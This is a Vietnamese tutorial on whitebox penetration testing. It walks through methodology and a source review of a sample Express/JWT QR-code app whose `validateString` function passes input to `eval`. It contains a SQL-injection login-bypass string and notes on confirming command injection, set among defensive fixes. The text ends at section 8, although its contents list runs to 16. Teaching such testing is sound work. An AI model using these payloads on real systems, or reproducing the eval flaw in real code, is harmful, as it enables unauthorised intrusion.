# MUC LUC

1. [Giới Thiệu về Whitebox Pentesting](#1-Giới-Thiệu-về-Whitebox-Pentesting)
2. [Xem xét mã nguồn (Code Review)](#2-Xem-xét-mã-nguồn-Code-Review)
3. [Kiểm tra cục bộ (Local Testing)](#3-Kiểm-tra-cục-bộ-Local-Testing)
4. [Minh chứng khái niệm (Proof of Concept - PoC)](#4-Minh-chứng-khái-niệm-Proof-of-Concept---PoC)
5. [Vá lỗ hổng và xử lý (Patching & Remediation)](#5-Vá-lỗ-hổng-và-xử-lý-Patching--Remediation)
6. [Phân tích mã nguồn - Xác thực (Authentication)](#6.-Phân-tích-mã-nguồn---Xác-thực-Authentication)
7. [Phân tích mã nguồn - Dịch vụ (Services)](#7.-Phân-tích-mã-nguồn---Dịch-vụ-Services)
8. [Kế hoạch kiểm thử bảo mật Whitebox](#8.-Kế-hoạch-kiểm-thử-bảo-mật-Whitebox)
9. [Tấn công Eval Injection](#9.-Tấn-công-Eval-Injection)
10. [Bước Tiếp Theo: Xác định Lỗ Hổng và Lập Kế Hoạch Tấn Công](#10.-Bước-Tiếp-Theo-Xác-định-Lỗ-Hổng-và-Lập-Kế-Hoạch-Tấn-Công)
11. [Thử Nghiệm Tiêm Mã (Code Injection)](#11.-Thử-Nghiệm-Tiêm-Mã-Code-Injection)
12. [Thực Thi Lệnh (Command Execution)](#12.-Thực-Thi-Lệnh-Command-Execution)
13. [Tiêm Phản Hồi HTTP (HTTP Response Injection)](#13.-Tiêm-Phản-Hồi-HTTP-HTTP-Response-Injection)
14. [Blind Exploitation - Phương Pháp "Sleep Timers" và "Boolean Output"](#14.-Blind-Exploitation---Phương-Pháp-Sleep-Timers-và-Boolean-Output)
15. [Phát Triển Exploit - Tự Động Hóa Quá Trình Khai Thác](#15.-Phát-Triển-Exploit---Tự-Động-Hóa-Quá-Trình-Khai-Thác)
16. [Patching & Remediation: Giải Pháp Bảo Mật và Khắc Phục Lỗ Hổng](#16.-Patching--Remediation-Giải-Pháp-Bảo-Mật-và-Khắc-Phục-Lỗ-Hổng)

---

# 1. Giới Thiệu về Whitebox Pentesting

---

#### **1. Whitebox Pentesting là gì?**

Whitebox pentesting (kiểm thử xâm nhập hộp trắng) là phương pháp kiểm thử bảo mật trong đó người kiểm thử có **toàn quyền hoặc một phần quyền truy cập và thông tin** về hệ thống mục tiêu. Điều này trái ngược với **blackbox pentesting**, nơi người kiểm thử chỉ có thông tin công khai và tiếp cận hệ thống như một kẻ tấn công thực sự.  

Trong whitebox pentesting, chúng ta thường được cung cấp:  
- **Mã nguồn đầy đủ** hoặc một phần của ứng dụng.  
- **Quyền truy cập** vào máy chủ backend, cơ sở dữ liệu, và các nhật ký máy chủ.  
- **Tài khoản với nhiều mức quyền** (bao gồm cả admin/root).  
- **Tài liệu chi tiết** về ứng dụng.  

Tuy nhiên, kiểm thử thường được thực hiện trên **môi trường thử nghiệm** (replica server), chứ không phải trên máy chủ sản xuất, để tránh ảnh hưởng đến hệ thống thật.

---

#### **2. Lợi ích của Whitebox Pentesting**

Whitebox pentesting mang lại nhiều lợi ích mà kiểm thử blackbox không có:  

1. **Phát hiện nhiều lỗ hổng hơn**:  
   - Giúp tìm ra những lỗ hổng ẩn sâu trong mã nguồn và backend, khó hoặc không thể phát hiện thông qua kiểm thử blackbox.  
   - Phát hiện các lỗ hổng trước khi chúng bị khai thác bởi kẻ tấn công.  

2. **Phù hợp với chu trình phát triển ứng dụng** (DevOps):  
   - Whitebox pentesting có thể bắt đầu từ khi ứng dụng còn đang phát triển, giúp phát hiện và sửa lỗi trước khi ứng dụng được triển khai chính thức.  
   - Tránh các thay đổi lớn gây trì hoãn do phải vá lỗi sau khi ứng dụng đã triển khai.  

3. **Hướng dẫn sửa lỗi chi tiết**:  
   - Người kiểm thử có thể đề xuất các bản vá chi tiết và trực tiếp cho mã nguồn, giúp vá lỗi tận gốc thay vì chỉ sửa tạm thời.  
   - Ví dụ: Nếu phát hiện lỗ hổng SQL injection, có thể đưa ra giải pháp tổng thể để ngăn chặn lỗ hổng SQL injection trên toàn bộ ứng dụng.  

4. **Nâng cao bảo mật lâu dài**:  
   - Cung cấp các khuyến nghị về lập trình an toàn để tránh tái diễn các lỗ hổng tương tự trong tương lai.  

---

#### **3. Tại sao vẫn cần Blackbox Pentesting?**

Dù whitebox pentesting rất hiệu quả, nó không thể thay thế hoàn toàn blackbox pentesting:  

- **Quan điểm tấn công khác nhau**:  
  Whitebox pentesting tiếp cận hệ thống từ góc độ của nhà phát triển, trong khi blackbox pentesting giúp kiểm thử hệ thống từ quan điểm của kẻ tấn công.  

- **Phát hiện lỗ hổng dễ bị bỏ sót**:  
  Một số lỗ hổng chỉ có thể được phát hiện khi kiểm thử hệ thống như một bên thứ ba mà không có thông tin nội bộ.  

- **Tốn thời gian và phức tạp hơn**:  
  Whitebox pentesting đòi hỏi nhiều thời gian và kiến thức chuyên sâu, đặc biệt đối với các ứng dụng lớn hoặc phức tạp. Do đó, nó thường chỉ được sử dụng cho các hệ thống quan trọng.  

---

#### **4. Quy Trình Whitebox Pentesting**

Quy trình kiểm thử xâm nhập hộp trắng có thể được chia thành **4 bước chính**:

1. **Code Review** (Kiểm tra mã nguồn):  
   - Phân tích tĩnh (static analysis) để xác định các chức năng tiềm ẩn lỗ hổng.  
   - Kết hợp phân tích động (dynamic analysis) trong một số trường hợp để hiểu rõ cách mã nguồn vận hành.  

2. **Local Testing** (Kiểm thử cục bộ):  
   - Thử nghiệm các chức năng đã được xác định trong môi trường thử nghiệm tương tự môi trường sản xuất.  
   - Sử dụng quyền truy cập vào server, cơ sở dữ liệu, và công cụ debug để phát hiện và khai thác lỗ hổng.  

3. **Proof of Concept (PoC)** (Minh chứng khai thác):  
   - Viết mã khai thác tự động để chứng minh lỗ hổng có thể bị khai thác.  
   - PoC phải an toàn, không gây ảnh hưởng đến dữ liệu hoặc hệ thống khi kiểm tra trên môi trường sản xuất.  

4. **Patching & Remediation** (Vá lỗi và khắc phục):  
   - Đề xuất các bản vá chi tiết với thay đổi cụ thể trong mã nguồn.  
   - Kiểm tra lại bản vá để đảm bảo lỗi đã được sửa và ứng dụng vẫn hoạt động bình thường.  
   - Đưa ra hướng dẫn lập trình an toàn để phòng tránh lỗ hổng tương tự trong tương lai.  

---

# 2. Xem xét mã nguồn (Code Review)

Đây là bước đầu tiên và quan trọng nhất trong quá trình kiểm thử xâm nhập dạng **whitebox**. Mục tiêu của bước này là phân tích mã nguồn của ứng dụng để hiểu rõ thiết kế và chức năng. Vì đây là một bước nâng cao, nó đòi hỏi kiến thức lập trình vững vàng để nắm được cách hoạt động của ứng dụng, cùng với khả năng đọc được nhiều ngôn ngữ lập trình và hiểu rõ các lỗ hổng tiềm ẩn. 

### Các bước thực hiện:

#### 1. **Lập kế hoạch và thu thập dữ liệu**
- **Mục đích**: Hiểu rõ thiết kế ứng dụng và chuẩn bị tài nguyên cần thiết.
- **Cách thực hiện**:
  - Gặp gỡ đội phát triển và các bên liên quan để hiểu tổng quan thiết kế ứng dụng.
  - Thu thập các tài nguyên như mã nguồn, tài liệu thiết kế, và thiết lập môi trường kiểm thử (test server).
  - Kiểm thử nên thực hiện trên môi trường giả lập trước khi áp dụng vào thực tế.

#### 2. **Lựa chọn phạm vi kiểm tra (Scope Selection)**
- **Lý do**: Không thể kiểm tra toàn bộ mã nguồn với các ứng dụng lớn. 
- **Cách thực hiện**:
  - **Dựa trên tài liệu thiết kế**: Nếu có tài liệu thiết kế, sử dụng để xác định các chức năng quan trọng cần kiểm tra.
  - **Tự phân tích mã nguồn**: Khi không có tài liệu, bạn cần đọc và phân tích mã để hiểu ý nghĩa từng chức năng.
  - **Lựa chọn thông minh**: Ưu tiên các chức năng quan trọng như xác thực (authentication) hoặc xử lý dữ liệu hệ thống.

#### 3. **Ưu tiên và thu hẹp phạm vi kiểm tra (Prioritization & Scope Reduction)**
- **Mục tiêu**: Giảm số lượng mã cần kiểm tra mà vẫn tập trung vào các phần dễ có lỗ hổng.
- **Các kỹ thuật lựa chọn**:
  1. **Dựa trên thiết kế ứng dụng**: Ưu tiên thư mục/chức năng quan trọng (VD: xử lý thanh toán trong thư mục `/purchases`).
  2. **Tìm kiếm từ khóa trong mã nguồn**: Sử dụng công cụ như `grep` để tìm các hàm nhạy cảm (VD: `exec`, `system` trong PHP).
  3. **Kết hợp kiểm tra động và tĩnh**: Phân tích mã và thử nghiệm ứng dụng để xác định các khu vực dễ tổn thương (VD: trang có nhiều lỗi).

#### 4. **Phân tích ngược (Reverse Engineering)**
- **Mục đích**: Hiểu rõ cách hoạt động và luồng dữ liệu của từng chức năng quan trọng.
- **Cách thực hiện**:
  - Đọc từng dòng mã, thêm ghi chú để giải thích chức năng của từng dòng.
  - Theo dõi biến, tham số và các hàm bên ngoài được gọi trong mã nguồn.
  - Phân tích đa lớp để tìm các lỗ hổng khó phát hiện (VD: kiểm tra đầu vào không an toàn từ nguồn phụ).

#### 5. **Ưu tiên mục tiêu kiểm tra (Prioritize Targets)**
- **Cách tiếp cận**: Sử dụng ma trận **Impact X Probability**:
  - Các lỗ hổng dễ khai thác và có ảnh hưởng cao sẽ được ưu tiên hàng đầu.
  - Lỗ hổng với xác suất thấp hoặc ít quan trọng có thể ưu tiên ở mức thấp hơn.
  - Kiểm tra từng mục tiêu theo thứ tự ưu tiên này.

---

# 3. Kiểm tra cục bộ (Local Testing)

Sau khi đã có danh sách ưu tiên các chức năng dễ bị tổn thương, bước tiếp theo là kiểm tra và gỡ lỗi cục bộ để xác nhận hoặc bác bỏ sự tồn tại của các lỗ hổng. Quá trình này tương tự như cách các nhà phát triển gỡ lỗi trong ứng dụng của họ, vì các lỗ hổng thực chất cũng là một dạng vấn đề trong mã nguồn.

---

### Các bước thực hiện:

#### 1. **Tái tạo backend**
- **Mục đích**: Thiết lập môi trường kiểm tra giống với môi trường sản xuất để đảm bảo tính chính xác khi phân tích động.
- **Cách thực hiện**:
  - Nếu nhóm phát triển cung cấp máy chủ kiểm tra (test server), bạn có thể bỏ qua bước này.
  - Trong trường hợp tự thiết lập:
    - Thu thập thông tin về các công cụ, tài nguyên (VD: file cấu hình `packages.json` của NodeJS).
    - Cài đặt các yêu cầu như cơ sở dữ liệu hoặc các kết nối bên ngoài.
    - Chạy thử để đảm bảo ứng dụng hoạt động bình thường.

  > **Lưu ý**: Nếu tài liệu không đầy đủ, bạn có thể mất nhiều thời gian để xác định các phụ thuộc và đảm bảo ứng dụng chạy mà không có lỗi. Điều này làm tăng chi phí kiểm thử.

---

#### 2. **Kiểm tra chức năng mục tiêu**
- **Mục tiêu**: 
  1. Kích hoạt được chức năng mục tiêu.
  2. Kiểm soát được cách đầu vào tác động đến chức năng đó.

- **Cách thực hiện**:
  1. **Kích hoạt chức năng mục tiêu**: 
     - Xác định các điều kiện cụ thể để hàm được gọi. 
     - Gỡ lỗi và kiểm tra nhiều lần để tìm hiểu cách hàm được kích hoạt.
  2. **Theo dõi đầu vào**: 
     - Lần theo luồng dữ liệu từ giao diện người dùng (front-end) đến hàm dễ bị tổn thương.
     - Quan sát cách đầu vào thay đổi qua các giai đoạn để xác định cách tác động.

  Khi đã kiểm soát được cách kích hoạt hàm và kiểm soát đầu vào, bạn có thể xác định chắc chắn liệu hàm đó có dễ bị tổn thương hay không.

---

#### 3. **Khai thác lỗ hổng (Exploitation)**
- **Mục đích**: Xác nhận cơ bản rằng chức năng mục tiêu có thể bị khai thác. Không cần tạo một khai thác hoàn chỉnh ở bước này, chỉ cần chứng minh được khả năng khai thác.

- **Cách thực hiện**:
  - Với lỗ hổng chèn lệnh (Command Injection): Thực hiện một lệnh đơn giản như `touch` hoặc `ping`.
  - Với lỗ hổng SQL Injection: Chạy một truy vấn nhỏ và kiểm tra nhật ký để xác nhận.

  > **Lưu ý**: Không cần vượt qua các bộ lọc bảo mật (VD: WAF) hoặc thực hiện khai thác phức tạp (VD: khai thác mù/blind exploitation) ở giai đoạn này. Mục tiêu chính là xác nhận liệu hàm có thực sự dễ bị tấn công hay không.

---

### Ví dụ minh họa:

#### **Tái tạo backend**
- **Tình huống**: Một ứng dụng NodeJS với cơ sở dữ liệu MongoDB.
  - Cài đặt các phụ thuộc từ file `packages.json`.
  - Khởi chạy môi trường kiểm tra với cơ sở dữ liệu giả lập.

#### **Kiểm tra chức năng mục tiêu**
- **Tình huống**: Hàm đăng nhập không mã hóa đúng mật khẩu.
  - Theo dõi luồng dữ liệu từ form đăng nhập qua các lớp xử lý đến hàm xác thực.
  - Phát hiện đầu vào không được mã hóa, dẫn đến lỗi bảo mật.

#### **Khai thác lỗ hổng**
- **Tình huống**: Lỗ hổng SQL Injection trong hàm đăng nhập.
  - Chèn câu lệnh `OR '1'='1'` để vượt qua xác thực.
  - Quan sát nhật ký để xác nhận truy vấn SQL đã thực thi chính xác.

---

# 4. Minh chứng khái niệm (Proof of Concept - PoC)

Bước này xác nhận rằng lỗ hổng đã được phát hiện và kiểm chứng, sau đó tối ưu hóa tác động khai thác để đạt mức độ nghiêm trọng cao nhất. Đây là quá trình chuẩn bị và tự động hóa các bước khai thác nhằm tái sử dụng dễ dàng, đồng thời có thể thử nghiệm trên môi trường sản xuất với sự thận trọng cao nhất.

---

### Quy trình thực hiện:

#### 1. **Khai thác toàn bộ chuỗi (Full Chain Exploitation)**

- **Mục tiêu**: 
  - Ghi lại toàn bộ quy trình khai thác từ đầu đến cuối.
  - Bỏ qua các cơ chế bảo mật (VD: WAF, Anti-Virus).
  - Chuẩn bị chuỗi payload cần thiết nếu cần khai thác nhiều lỗ hổng.

- **Các bước chi tiết**:
  1. **Xác định vị trí ban đầu của mục tiêu**: Tìm hiểu cách tiếp cận mục tiêu từ phía client hoặc backend.
  2. **Chuẩn bị payload phía client**: Xác định payload có thể chèn qua giao diện người dùng.
  3. **Chèn payload bổ sung nếu cần**: Trong trường hợp phải liên kết nhiều lỗ hổng.
  4. **Ghi lại các bước bypass bảo mật**: Điều chỉnh payload hoặc các yêu cầu web để vượt qua cơ chế bảo vệ.

  > **Lưu ý**: Quá trình khai thác phải đảm bảo tối ưu hóa payload để vượt qua các lớp bảo mật. Nếu không đạt được khai thác hoàn chỉnh trên môi trường sản xuất, lỗ hổng vẫn có thể được báo cáo, nhưng mức độ nghiêm trọng sẽ thấp hơn.

#### 2. **Phát triển mã khai thác (Exploit Development)**

- **Mục đích**: 
  - Tự động hóa toàn bộ quy trình khai thác.
  - Tối ưu hóa ngôn ngữ lập trình dựa trên mục tiêu cụ thể.

- **Chọn ngôn ngữ lập trình phù hợp**:
  - **Ứng dụng mạng/web**: Python (thư viện đa năng và dễ triển khai).
  - **Tấn công phía client (VD: CSRF)**: JavaScript (trình duyệt hỗ trợ sẵn).
  - **Khai thác chuỗi web phức tạp**: Kết hợp Python và JavaScript.
  - **Khai thác nhị phân**: Python (hoặc C/C++ để phát triển mã cấp thấp).
  - **Hệ điều hành/ứng dụng thick client**: Sử dụng ngôn ngữ của ứng dụng đó (tiết kiệm thời gian viết lại logic).

- **Quy trình viết mã**:
  1. Tái tạo các bước khai thác thủ công trong mã.
  2. Tạo cấu trúc rõ ràng để xử lý lỗi và phục hồi dữ liệu trong trường hợp khai thác thất bại.
  3. Đảm bảo mã có thể dễ dàng chuyển đổi từ môi trường kiểm thử sang môi trường thực.

#### 3. **Kiểm tra trên mục tiêu thực (Test on Real Target)**

- **Mục tiêu**: Đảm bảo mã khai thác hoạt động chính xác trên môi trường thực.
- **Các nguyên tắc quan trọng**:
  1. **Tính khả hồi**:
     - Xóa các tài khoản hoặc dữ liệu được tạo trong quá trình kiểm tra.
     - Khôi phục mật khẩu hoặc dữ liệu đã sửa đổi.
     - Làm sạch tất cả các dấu vết (VD: nhật ký máy chủ, cơ sở dữ liệu).
  2. **Tính an toàn**:
     - Không bao giờ chỉnh sửa dữ liệu quan trọng.
     - Luôn thử nghiệm trên dữ liệu tự tạo hoặc dữ liệu không quan trọng.
     - Đảm bảo không có thời gian chết (downtime), mất dữ liệu hoặc thay đổi vĩnh viễn.
  3. **Xử lý lỗi**: Thiết kế mã khai thác có khả năng tự hoàn nguyên khi thất bại.

- **Lưu ý quan trọng**: Chỉ thử nghiệm mã khai thác trên môi trường thực sau khi đã kiểm tra kỹ lưỡng trong môi trường kiểm thử với tất cả các cơ chế bảo mật được kích hoạt.

---

# 5. Vá lỗ hổng và xử lý (Patching & Remediation)

Giai đoạn cuối cùng trong bài kiểm thử hộp trắng (whitebox pentesting) là vá lỗ hổng và xử lý. Đây là bước quan trọng nhằm đảm bảo rằng tất cả các lỗ hổng đã được xác định đều được xử lý một cách triệt để, đồng thời đảm bảo ứng dụng không bị gián đoạn hoặc suy giảm chức năng.

---

### Quy trình thực hiện:

#### 1. **Vá lỗi (Patching)**

- **Mục tiêu**: Loại bỏ hoàn toàn lỗ hổng mà không ảnh hưởng đến chức năng hiện tại.
  
- **Quy trình**:
  1. **Xác định thay đổi cần thiết**:
     - Dựa trên hiểu biết sâu về cách hoạt động của từng chức năng và nguyên nhân gây ra lỗ hổng.
     - Đề xuất các thay đổi cụ thể trong mã nguồn.
  2. **Áp dụng và kiểm tra bản vá**:
     - Cài đặt bản vá trong môi trường kiểm thử.
     - Thực hiện lại bài kiểm thử **Local Testing** để đảm bảo rằng:
       - **Payload** độc hại không còn hoạt động.
       - Lỗ hổng được vá triệt để tại mọi giai đoạn.
     - Đảm bảo **không phá vỡ chức năng gốc**.
  3. **Lặp lại quá trình kiểm thử**:
     - Nếu phát hiện lỗ hổng vẫn tồn tại ở bất kỳ giai đoạn nào, cập nhật bản vá và kiểm tra lại.

> **Lưu ý**: Đối với một số ứng dụng phức tạp, việc vá lỗi có thể yêu cầu thay đổi lớn, nằm ngoài phạm vi của bài kiểm thử. Trong trường hợp này, nên cung cấp hướng dẫn cụ thể để đội ngũ phát triển thực hiện.

---

#### 2. **Báo cáo (Reporting)**

- **Mục tiêu**: Tổng hợp toàn bộ quy trình kiểm thử, kết quả và giải pháp đề xuất vào một báo cáo hoàn chỉnh.

- **Nội dung báo cáo**:
  1. **Mô tả lỗ hổng**:
     - Giải thích cách khai thác (bao gồm các bước thực hiện và mã PoC nếu có).
     - Nêu rõ mức độ nghiêm trọng và tác động tiềm năng của lỗ hổng.
  2. **Phân tích mã nguồn**:
     - Đánh giá từng chức năng, chỉ ra các vấn đề tiềm ẩn.
     - Đề xuất chi tiết về các bản vá (bao gồm đoạn mã đã sửa đổi).
  3. **Kết quả kiểm tra bản vá**:
     - Xác nhận rằng bản vá đã hoạt động hiệu quả.
     - Nếu bản vá chưa được kiểm tra đầy đủ (VD: ảnh hưởng đến các chức năng khác), cần ghi chú rõ.
  4. **Đề xuất cải thiện mã hóa an toàn (Secure Coding Tips)**:
     - Cung cấp các nguyên tắc mã hóa an toàn để tránh tái diễn lỗ hổng tương tự.
     - Các nguyên tắc nên được tóm tắt, khuyến khích đội phát triển học hỏi sâu hơn về lập trình bảo mật.

---


# 6.Phân tích mã nguồn - Xác thực (Authentication)

Trong quá trình kiểm thử hộp trắng (whitebox pentesting), chúng ta sẽ tập trung vào phân tích tính năng xác thực trong mã nguồn của ứng dụng. Đây là bước đầu tiên để tìm hiểu và xác định các lỗ hổng tiềm ẩn liên quan đến xác thực.

---

### **1. Tổng quan cấu trúc mã nguồn**

**Tệp chính: `app.js`**
- Thiết lập máy chủ **Express** cơ bản với:
  - Bộ phân tích JSON body (Body Parser).
  - Cấu hình CORS.
  - Khai báo các route chính:
    ```javascript
    app.use("/api/auth", authRoutes);
    app.use("/api/service", serviceRoutes);
    ```
- Điểm quan trọng nhất ở tệp này là các **API routes**, đặc biệt là route liên quan đến xác thực (`/api/auth`).

---

### **2. Phân tích các route trong xác thực**

**Tệp `auth-routes.js`**
- Chứa route `/authenticate` với phương thức POST, trỏ tới hàm `getUserToken`.

**Tệp `auth-controller.js`**
- Chứa các chức năng chính liên quan đến xác thực:
  1. `validateEmail`: Kiểm tra định dạng email.
  2. `getUserToken`: Tạo và trả về mã xác thực JWT (JSON Web Token).
  3. `verifyToken`: Xác minh JWT từ yêu cầu đầu vào.

---

### **3. Chi tiết từng hàm**

#### **a) `validateEmail`**
- Hàm kiểm tra định dạng email bằng biểu thức chính quy (regex):
  ```javascript
  function validateEmail(email) {
    return email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
  }
  ```
- Đây là một hàm cơ bản, không có dấu hiệu của lỗ hổng.

#### **b) `getUserToken`**
- Mục tiêu:
  - Nhận tham số **email** từ JSON body của yêu cầu POST.
  - Kiểm tra định dạng email bằng `validateEmail`.
  - Tạo JWT với 2 khóa:
    - `email`: Giá trị được nhập từ người dùng.
    - `role`: Xác định dựa trên email.
  - Trả về JWT cho người dùng:
    ```javascript
    const token = jwt.sign({ email, role }, secretKey, { expiresIn: "1h" });
    res.json({ token });
    ```

- **Phân tích lỗ hổng tiềm năng**:
  - **Thiếu xác thực đầu vào**:
    - Hàm `validateEmail` chỉ kiểm tra định dạng email nhưng không kiểm tra các giá trị nguy hiểm (payload xâm nhập).
  - **Mã hóa JWT không an toàn**:
    - Nếu `secretKey` không được bảo vệ tốt hoặc dễ đoán, JWT có thể bị giả mạo.
    - Không xác minh email từ cơ sở dữ liệu → Lỗ hổng cho phép người dùng giả mạo bất kỳ email nào.

#### **c) `verifyToken`**
- Mục tiêu:
  - Lấy mã JWT từ HTTP header (`req.headers.authorization`).
  - Xác minh JWT bằng `jwt.verify`:
    ```javascript
    const decoded = jwt.verify(token, secretKey);
    req.user = decoded;
    next();
    ```
- **Phân tích lỗ hổng tiềm năng**:
  - **JWT dễ bị tấn công replay**:
    - Token có thể được sử dụng lại nếu không có cơ chế ngăn chặn.
  - **Thiếu xác minh vai trò (role)**:
    - Chỉ kiểm tra tính hợp lệ của token mà không kiểm tra vai trò người dùng trong các yêu cầu tiếp theo.

---

### **4. Đề xuất vá lỗi**

#### **a) Tăng cường kiểm tra đầu vào**
- Sử dụng thư viện như **Joi** để xác thực JSON body.
  ```javascript
  const schema = Joi.object({
    email: Joi.string().email().required(),
  });
  const { error } = schema.validate(req.body);
  if (error) return res.status(400).send("Invalid input");
  ```

#### **b) Bảo vệ khóa bí mật (Secret Key)**
- Lưu trữ `secretKey` trong biến môi trường và sử dụng mã hóa mạnh:
  ```javascript
  const secretKey = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');
  ```

#### **c) Bổ sung cơ chế chống tấn công replay**
- Tạo **danh sách đen (blacklist)** cho token đã bị thu hồi hoặc hết hạn.

#### **d) Xác minh vai trò người dùng**
- Kiểm tra vai trò trước khi xử lý yêu cầu:
  ```javascript
  if (req.user.role !== "admin") {
    return res.status(403).send("Access denied");
  }
  ```

---


# 7. Phân tích mã nguồn - Dịch vụ (Services)

Tiếp theo sau phần xác thực, chúng ta sẽ phân tích các API endpoints liên quan đến dịch vụ trong ứng dụng, đặc biệt là **`/api/service`**.

---

### **1. Tổng quan về `service-routes.js`**

**Tệp `service-routes.js`** chỉ có một endpoint duy nhất là `/generate`, với phương thức **POST**. Endpoint này yêu cầu xác thực thông qua hàm **`verifyToken`**, như đã được giải thích trong phần trước.

```javascript
router.use(verifyToken);
router.post("/generate", generateQR);
```

Endpoint `/generate` sử dụng hàm **`generateQR`**, chúng ta sẽ tiếp tục phân tích mã của hàm này để tìm hiểu cách nó hoạt động và các lỗ hổng tiềm ẩn.

---

### **2. Phân tích hàm `generateQR`**

**Tệp `service-controllers.js`** chứa hai hàm:
1. **`validateString`**
2. **`generateQR`**

Hàm **`generateQR`** thực hiện các bước sau:
- Lấy tham số `text` từ body của yêu cầu POST.
- Lấy tham số `role` từ đối tượng `req.user` (được thiết lập trong quá trình xác thực JWT).
- Sau đó, hàm gọi **`QRCode.toDataURL`** từ thư viện **qrcode** để tạo mã QR từ văn bản đã cho.

Hàm này có vẻ như không có vấn đề nghiêm trọng, nhưng việc sử dụng **`QRCode.toDataURL`** (một thư viện bên ngoài) có thể tiềm ẩn rủi ro bảo mật nếu thư viện này có lỗ hổng đã biết. Tuy nhiên, việc kiểm tra mã nguồn của thư viện bên ngoài thường không nằm trong phạm vi của một bài kiểm thử whitebox, trừ khi thư viện đó có lỗ hổng công khai mà có thể khai thác được.

---

### **3. Phân tích hàm `validateString`**

Hàm **`validateString`** có nhiệm vụ kiểm tra tính hợp lệ của chuỗi đầu vào. Cụ thể:
- Kiểm tra nếu `input` không phải là chuỗi.
- Kiểm tra nếu chuỗi có độ dài bằng 0.
- Kiểm tra nếu chuỗi chứa các ký tự nguy hiểm như `'`, `"`, `` ` ``, hoặc `;`.

Mã của hàm như sau:
```javascript
function validateString(input, onError) {
  if (
    typeof input !== "string" ||
    input.length == 0 ||
    input.match(/['"`;]/g)
  ) {
    eval(onError);
    return false;
  }
  return true;
}
```

### **Phân tích lỗ hổng tiềm ẩn:**
- **Sử dụng `eval`**: Đây là một điểm yếu lớn. Hàm **`eval`** có thể thực thi bất kỳ mã JavaScript nào được cung cấp dưới dạng chuỗi, dẫn đến nguy cơ **tấn công mã độc (code injection)**.
  - Nếu một kẻ tấn công có thể kiểm soát đối số `onError`, họ có thể thực thi mã JavaScript độc hại, gây hại cho hệ thống.

- **Kiểm tra đầu vào không đủ mạnh**:
  - Hàm kiểm tra các ký tự đặc biệt như `'`, `"`, `` ` ``, và `;`, nhưng vẫn có thể tồn tại các ký tự khác có thể gây ra tấn công, ví dụ như các ký tự đặc biệt trong JavaScript hoặc các ký tự không thể nhìn thấy (như các ký tự điều khiển).
  - Việc kiểm tra này có thể bị bỏ qua trong các trường hợp có sự lợi dụng tinh vi.

### **Đề xuất cải tiến và vá lỗi:**

1. **Loại bỏ `eval`**:
   - Việc sử dụng `eval` là rất nguy hiểm và cần được thay thế bằng một phương pháp an toàn hơn. Ví dụ, có thể sử dụng **callback** thay vì thực thi mã JavaScript:
     ```javascript
     if (typeof input !== "string" || input.length == 0 || input.match(/['"`;]/g)) {
       onError("Invalid input detected");
       return false;
     }
     ```

2. **Cải tiến kiểm tra đầu vào**:
   - Ngoài việc kiểm tra các ký tự đặc biệt, có thể sử dụng các thư viện như **Joi** hoặc **validator** để thực hiện các kiểm tra đầu vào mạnh mẽ hơn và chống lại các tấn công như **XSS (Cross-Site Scripting)** hoặc **SQL injection**.

   - Thêm kiểm tra chuỗi dài hơn hoặc đặc biệt để đảm bảo an toàn tuyệt đối.

---

### **4. Kiểm tra các gói thư viện bên ngoài**

Ngoài việc phân tích mã nguồn trong các endpoint dịch vụ, một phần quan trọng khác là kiểm tra các thư viện bên ngoài, như **qrcode**. Để làm việc này, chúng ta có thể sử dụng công cụ như **npm audit** để kiểm tra các lỗ hổng bảo mật trong các thư viện đã cài đặt.

```bash
npm audit
```

---

# 8. Kế hoạch kiểm thử bảo mật Whitebox

Bây giờ chúng ta đã có cái nhìn tổng quan về mã nguồn và các hàm chức năng trong ứng dụng, chúng ta có thể tiến hành bước tiếp theo trong quy trình **Pentesting Whitebox**, đó là **Kiểm thử cục bộ (Local Testing)**. Trong phần này, chúng ta sẽ thiết lập môi trường thử nghiệm cho ứng dụng web và kiểm tra chức năng mà chúng ta đã chọn lọc để xác định xem có lỗ hổng bảo mật nào có thể khai thác được không.

---

### **1. Cài đặt môi trường thử nghiệm cục bộ**

Để thực hiện kiểm thử cục bộ, chúng ta cần thiết lập ứng dụng web trong môi trường của mình. Trong trường hợp này, ứng dụng được cung cấp dưới dạng mã nguồn, và nhiệm vụ của chúng ta là khởi động nó trên một hệ thống cục bộ.

#### **Các bước cài đặt môi trường:**

- Đầu tiên, di chuyển vào thư mục chứa mã nguồn của ứng dụng và cài đặt các phụ thuộc:
  ```bash
  cd ./intro_to_whitebox_pentesting
  npm install
  ```

- Sau khi các gói phụ thuộc được cài đặt, khởi động ứng dụng:
  ```bash
  npm run dev
  ```
  Kết quả sẽ hiển thị như sau:
  ```bash
  > [email protected] dev
  > nodemon src/app.js
  [nodemon] 3.0.1
  [nodemon] to restart at any time, enter `rs`
  [nodemon] starting `node src/app.js`
  ⚡ [server]: Server is running at http://localhost:5000
  ```

- Sau khi ứng dụng đã chạy, bạn có thể thử lấy **token xác thực** để kiểm tra xem ứng dụng có hoạt động đúng không, bằng cách gửi một yêu cầu **POST** tới `/api/auth/authenticate` với email hợp lệ trong thân yêu cầu JSON. Câu lệnh `curl` có thể như sau:
  ```bash
  curl -X POST -H "Content-Type: application/json" -d '{"email": "test@example.com"}' http://localhost:5000/api/auth/authenticate
  ```
  Nếu thành công, bạn sẽ nhận được một mã thông báo xác thực (JWT), và có thể sử dụng mã này trong các yêu cầu tiếp theo.

---

### **2. Kiểm tra lỗ hổng công khai trong các gói phụ thuộc**

Trước khi tiến hành thử nghiệm chức năng, ta nên kiểm tra các gói phụ thuộc của ứng dụng để tìm các lỗ hổng bảo mật công khai, nếu có. Điều này có thể dễ dàng thực hiện thông qua câu lệnh `npm audit`.

- Chạy lệnh sau để kiểm tra các lỗ hổng bảo mật:
  ```bash
  npm audit
  ```

- Kết quả trả về sẽ cho thấy liệu có bất kỳ lỗ hổng bảo mật nào trong các gói phụ thuộc hay không. Nếu có, bạn sẽ cần phải cập nhật các gói bị lỗi.

Lưu ý: Đôi khi việc cập nhật một gói thư viện có thể yêu cầu nâng cấp phiên bản chính, điều này có thể gây ra các thay đổi không tương thích trong mã nguồn. Các nhà phát triển cần kiểm tra và cập nhật mã của ứng dụng nếu cần thiết.

---

### **3. Thử nghiệm chức năng `validateString`**

Chúng ta sẽ bắt đầu thử nghiệm chức năng `validateString`, như đã được chọn lọc trong phần phân tích trước đó. Cụ thể, ta sẽ thử nghiệm endpoint `/api/service/generate` của ứng dụng, nơi mà hàm `validateString` được sử dụng.

